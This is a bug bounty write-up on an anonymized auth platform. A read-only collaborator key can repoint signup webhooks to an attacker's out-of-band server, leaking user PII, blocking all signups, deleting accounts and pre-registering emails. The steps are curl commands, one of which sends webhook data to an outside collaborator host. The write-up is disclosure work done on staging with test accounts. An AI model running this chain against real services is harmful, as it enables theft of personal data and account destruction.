---
icon: comet
cover: >-
  ../../.gitbook/assets/satoru-gojo-jujutsu-kaisen-4k-wallpaper-uhdpaper.com-670@5@l.jpg
coverY: 432.8864652617431
---

# SSRF - PII Exfil, Signup DoS, User Deletion & Email Lock

## Read-Only Collaborator → Webhook Hijack → Silent PII Exfil on Every Signup + Signup DoS + Account Deletion

> **Disclaimer:** Target domain has been anonymized as `sn0x.com` / `sn0xauth = TARGET.COM` for this writeup. All testing was performed on a staging environment using attacker-controlled test accounts only. No real user data was accessed or retained.

***

### TL;DR

Found a broken access control + missing domain validation combo on the sn0xauth webhook configuration endpoint. A **read-only collaborator**  the lowest privilege level possible on a shared project can:

1. **Silently redirect all signup PII to an attacker server** every new user's email, name, IP, user agent, user ID gets POSTed to attacker.com automatically by the sn0xauth microservice
2. **Permanently block all user registrations** full signup DoS, owner gets zero alert
3. **Delete any user account** using the user ID received via the webhook
4. **Pre-register ghost users** block specific email addresses from ever signing up

All of this with a `read_only` collaborator API key. The kind of key you'd give to a junior dev or contractor to "just look at things."

***

### Background How sn0xauth Webhooks Work

So sn0xauth has a webhook feature. When auth events happen (user signs up, logs in, etc.), the platform POSTs a JSON payload to a URL you configure. Legitimate use case: sync new users to your CRM, send welcome emails, whatever.

The webhook is configured via:

```
PUT /api/v2/projects/{project_id}/branches/{branch_id}/auth/webhooks
```

You set a `webhook_url`, pick which events you want (`user.created`, `user.before_create`, etc.), and the sn0xauth microservice handles the delivery.

The problem? **No domain allowlist. No challenge verification. No permission check.** Any collaborator even read-only can point this webhook anywhere they want.

The moment I saw "webhook URL, no domain validation, accessible to collaborators" I knew exactly where this was going.

***

### The Attack Surface What I Was Thinking

When I found the webhook endpoint during API enumeration, my immediate thought process was:

> _"Webhooks are basically SSRF by design  you're telling a server to make HTTP requests to a URL you specify. If there's no domain restriction, that's attacker-controlled SSRF. And if the webhook fires on every signup with user data... that's a continuous PII exfiltration pipeline."_

Three questions I asked:

1. Can a read-only collaborator call this endpoint? → should be blocked, let's check
2. Is there any domain allowlist on `webhook_url`? → probably not
3. What data does the webhook payload contain? → probably PII

Spoiler: all three answers were exactly as bad as I hoped.

***

### Step 1 - Setup: Owner Shares Project With Attacker

This is the legitimate product flow. Owner adds a collaborator as `read_only`:

```bash
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ curl -s -X POST "https://console-stage.sn0x.build/api/v2/projects/curly-wave-85507548/permissions" \
  -H "Authorization: Bearer <OWNER_API_KEY>" \
  -H "Content-Type: application/json" \
  -H "X-Bug-Bounty: sn0x" \
  -d '{"email":"attacker@gmail.com","permission":"read_only"}'
```

```json
{
  "id": "e3c3a9e0-69d1-4f22-b81b-be78ba2b9a4c",
  "granted_to_email": "attacker@gmail.com",
  "granted_at": "2026-06-24T16:24:46Z"
}
```

Normal. Expected. The attacker is now a `read_only` collaborator in theory, they can only read things.

***

### Step 2 - Attacker Sets Webhook to Their Own Server (With read\_only Key)

Here's the key thing  I'm using the **attacker's read\_only API key** for this request. Not the owner's.

```bash
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ curl -s -X PUT "https://console-stage.sn0x.build/api/v2/projects/curly-wave-85507548/branches/br-dawn-cloud-w2lagjoi/auth/webhooks" \
  -H "Authorization: Bearer <ATTACKER_READ_ONLY_KEY>" \
  -H "Content-Type: application/json" \
  -H "X-Bug-Bounty: sn0x" \
  -d '{
    "enabled": true,
    "webhook_url": "https://svr5bi289zaazlv9ugq8svbay14ssjg8.oastify.com/sn0x-pii-exfil",
    "enabled_events": ["user.created"],
    "timeout_seconds": 10
  }'
```

```json
{
  "enabled": true,
  "webhook_url": "https://svr5bi289zaazlv9ugq8svbay14ssjg8.oastify.com/sn0x-pii-exfil",
  "enabled_events": ["user.created"],
  "timeout_seconds": 10
}
```

**HTTP 200. No error. No permission denied. Nothing.**

The read-only collaborator just modified a security-critical configuration — the webhook URL — without any authorization check. This should have been a 403. It wasn't.

Two separate bugs here that compound each other:

**Bug 1 -  Broken Access Control:** `PUT /auth/webhooks` doesn't enforce the collaborator permission level. `read_only` should be read-only. It isn't.

**Bug 2 - No Domain Validation:** Even if this endpoint was owner-only, there's zero validation on `webhook_url`. No allowlist. No challenge-response verification (like Stripe does — they send a test event to verify you own the endpoint). You can point it at any HTTPS URL in the world.

***

### Step 3 -  Victim Signs Up (Normal Flow, Zero Indication)

Now just wait for a user to sign up. The victim's experience is completely normal:

```bash
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ curl -s -X POST "https://ep-royal-frost-w25br9zj.sn0xauth.us-east-2.aws.sn0x.build/sn0xdb/auth/sign-up/email" \
  -H "Content-Type: application/json" \
  -H "Origin: https://console-stage.sn0x.build" \
  -d '{
    "email": "victim@example.com",
    "password": "PocTest1234567!",
    "name": "Victim User"
  }'
```

```json
{
  "token": "PhBAkZ7T6ARRhCySR8vZxuqDUoWE3lS7",
  "user": {
    "name": "Victim User",
    "email": "victim@example.com",
    "emailVerified": false,
    "createdAt": "2026-06-24T17:56:41.937Z",
    "role": "user",
    "id": "f615878c-a838-4f89-a140-cafc0bfad1e1"
  }
}
```

Signup succeeds. Victim has no idea what's about to happen in the background.

***

### Step 4 - Burp Collaborator Receives the Callback

Immediately after the signup  my Burp Collaborator (OAST server) lights up:

<figure><img src="../../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>

```
DNS callbacks from:
3.142xxxx   → AWS us-east-2
3.139.xxxx → AWS us-east-2
3.19.1xxxx  → AWS us-east-2
18.191.1xxxx → sn0xauth microservice (HTTP callback)
[+ 6 more retry attempts]
```

All source IPs are AWS us-east-2 the same region as `sn0xauth.us-east-2.aws.sn0x.build`. This is the sn0xauth microservice making outbound HTTP requests to my server. The retry behavior (6+ attempts) is interesting  sn0xauth has a built-in retry mechanism, meaning even if my server is briefly down, it'll keep trying to deliver the PII.

#### The Full PII Payload Delivered to Attacker Server

Here's what landed on my OAST server complete HTTP POST from the sn0xauth microservice:

```http
POST /sn0x-pii-exfil HTTP/1.1
Host: svr5bi289zaazlv9ugq8svbay14ssjg8.oastify.com
Accept: application/json, text/plain, */*
Content-Type: application/json
User-Agent: sn0xAuth-Webhooks/1.0
X-sn0x-Delivery-Attempt: 1
X-sn0x-Event-Id: 424a7b9f-f038-407f-8aab-a47d1e4d6ba8
X-sn0x-Event-Type: user.created
X-sn0x-Signature: eyJhbGciOiJFZERTQSIsImtpZCI6ImEzNmI4YmM0...
X-sn0x-Signature-Kid: a36b8bc4-70fc-4445-a45c-9bbc1bd7c9d6
X-sn0x-Timestamp: 1782318907562

{
  "event_id": "424a7b9f-f038-407f-8aab-a47d1e4d6ba8",
  "event_type": "user.created",
  "timestamp": "2026-06-24T16:35:07.562Z",
  "context": {
    "endpoint_id": "ep-royal-frost-w25br9zj",
    "project_name": "curly-wave"
  },
  "user": {
    "name": "Alice Victim",
    "email": "poc-victim-alice@example.com",
    "image": null,
    "role": "user",
    "banned": false,
    "id": "63e5801e-d931-419d-add3-6084fc1e67e5",
    "email_verified": false,
    "created_at": "2026-06-24T16:35:07.565Z",
    "updated_at": "2026-06-24T16:35:07.565Z"
  },
  "event_data": {
    "auth_provider": "credential",
    "ip_address": "157.20.184.46",
    "user_agent": "curl/8.19.0"
  }
}
```

Everything the attacker needs to track, identify, or impersonate this user:

| Field                   | Value                        | Why It Matters                                             |
| ----------------------- | ---------------------------- | ---------------------------------------------------------- |
| `user.email`            | poc-victim-alice@example.com | Direct PII — GDPR/CCPA covered                             |
| `user.name`             | Alice Victim                 | Full name — PII                                            |
| `user.id`               | 63e5801e-...                 | Persistent identifier — used for account deletion (Step 6) |
| `event_data.ip_address` | 157.20.184.46                | Location data — PII                                        |
| `event_data.user_agent` | curl/8.19.0                  | Device fingerprint                                         |

And this fires for **every single signup**. Automatically. Silently. Forever — until the project owner discovers and changes the webhook URL.

#### Why This Is SSRF, Not Just a Misconfiguration

The sn0xauth microservice is making outbound HTTP requests from inside sn0x's AWS infrastructure (`18.191.122.246`) to an attacker-controlled server. This is textbook **Server-Side Request Forgery** attacker controls where an internal service makes HTTP requests.

The typical next question with SSRF: can you hit internal endpoints? With HTTPS-only validation the surface is limited vs HTTP, but the architecture means the sn0xauth microservice is inside the AWS VPC. Depending on what's reachable from its network position, this could potentially reach internal services.

***

### Step 5 - Signup DoS (Completely Blocking New Registrations)

This is where the `user.before_create` event comes in. If the webhook is set to fire **before** user creation, and the attacker's server returns a non-200 response sn0xauth blocks the signup entirely.

```bash
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ curl -s -X PUT "https://console-stage.sn0x.build/api/v2/projects/curly-wave-85507548/branches/br-dawn-cloud-w2lagjoi/auth/webhooks" \
  -H "Authorization: Bearer <ATTACKER_READ_ONLY_KEY>" \
  -H "Content-Type: application/json" \
  -d '{
    "enabled": true,
    "webhook_url": "https://svr5bi289zaazlv9ugq8svbay14ssjg8.oastify.com/block",
    "enabled_events": ["user.before_create", "user.created"],
    "timeout_seconds": 10
  }'
```

My OAST server returns 500. Now any signup attempt:

```bash
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ curl -s -X POST ".../sn0xdb/auth/sign-up/email" \
  -H "Content-Type: application/json" \
  -d '{"email":"new-user@example.com","password":"PocTest1234567!","name":"New User"}'
```

```json
{
  "code": "WEBHOOK_INVALID_RESPONSE",
  "message": "Unable to complete sign-up at this time. Please try again later."
}
```

**Every single signup is blocked.** Permanently. The project owner receives zero notification. Users see a generic error and assume the app is broken. Recovery requires the owner to manually discover that someone changed their webhook  which requires knowing to check it in the first place.

This is a complete **authentication system DoS** triggered by the lowest privilege user on the platform.

***

### Step 6 -  Bonus: Delete Any User Account in Real Time

Here's where it gets nastier. The webhook payload delivers `user.id` for every signup. And there's a separate endpoint:

```
DELETE /api/v2/projects/{project_id}/branches/{branch_id}/auth/users/{user_id}
```

Also callable with a read-only collaborator key. So the attacker can:

1. Webhook fires → attacker receives `user.id`
2. Attacker immediately calls DELETE with that ID
3. User account is gone before they've even finished the signup flow

```bash
# Step A — victim signs up
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ curl -s -X POST ".../sn0xdb/auth/sign-up/email" \
  -d '{"email":"victim@example.com","password":"PocTest1234567!","name":"DeleteVictim"}'
```

```json
{
  "token": "K8zPlLTLsTeGS2uyK71J35creGCuAvYo",
  "user": {
    "id": "5a5627c8-3f75-4f59-930f-6e596c79e8be",
    "email": "victim@example.com"
  }
}
```

Webhook delivers this `user.id` to attacker in real time. Attacker immediately:

```bash
# Step B — attacker deletes the account with read_only key
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ curl -si -X DELETE "https://console-stage.sn0x.build/api/v2/projects/curly-wave-85507548/branches/br-dawn-cloud-w2lagjoi/auth/users/5a5627c8-3f75-4f59-930f-6e596c79e8be" \
  -H "Authorization: Bearer <ATTACKER_READ_ONLY_KEY>"
```

```
HTTP/2 204
```

Done. Account deleted. Victim tries to log in:

```bash
# Step C — victim tries to sign in
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ curl -s -X POST ".../sn0xdb/auth/sign-in/email" \
  -d '{"email":"victim@example.com","password":"PocTest1234567!"}'
```

```json
{
  "code": "INVALID_EMAIL_OR_PASSWORD",
  "message": "Invalid email or password"
}
```

Account is gone. Victim thinks they mistyped their password. Attacker can do this to every single user who signs up continuously, automatically, by just listening to the webhook stream.

***

### Step 7 - Bonus 2: Block Specific Emails From Ever Registering (Ghost User Attack)

There's also `POST /auth/users`  lets you create a user record without a password. A read-only collaborator can pre-register any email address:

```bash
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ curl -s -X POST "https://console-stage.sn0x.build/api/v2/projects/curly-wave-85507548/branches/br-dawn-cloud-w2lagjoi/auth/users" \
  -H "Authorization: Bearer <ATTACKER_READ_ONLY_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"email":"ceo-target@example.com","name":"Ghost"}'
```

```json
{
  "id": "749cda28-bf61-4cb7-93d3-e359de27766c"
}
```

Now when the real person tries to sign up with that email:

```bash
┌──(sn0x㉿sn0x)-[~/bb/targets/sn0xauth]
└─$ curl -s -X POST ".../sn0xdb/auth/sign-up/email" \
  -d '{"email":"ceo-target@example.com","password":"Legit1234!","name":"RealCEO"}'
```

```json
{
  "code": "USER_ALREADY_EXISTS_USE_ANOTHER_EMAIL",
  "message": "User already exists. Use another email."
}
```

Permanently locked out. The ghost account has no password so the real user can't even do a password reset to claim it. The only fix is the project owner manually finding and deleting the ghost record.

Targeted harassment vector: attacker pre-registers `admin@targetcompany.com`, `ceo@targetcompany.com`, any email they want blocked.

***

### Full Attack Chain End to End

```
read_only collaborator key
         │
         ▼
PUT /auth/webhooks → set webhook_url = attacker.com (no permission check, no domain validation)
         │
         ▼
Every user signs up on victim's app
         │
         ▼
sn0xauth microservice (18.x.x.x, AWS us-east-2) POSTs to attacker.com:
  → email, name, user ID, IP, user agent (PII exfil)
  → with retry logic (6+ attempts) until acknowledged
         │
         ├──→ Log all PII silently forever
         │
         ├──→ Immediately DELETE user account using received user.id
         │
         └──→ Switch to before_create → return 500 → all signups permanently blocked
```

No victim interaction required after initial setup. No alerts to owner. No indication to users.

***
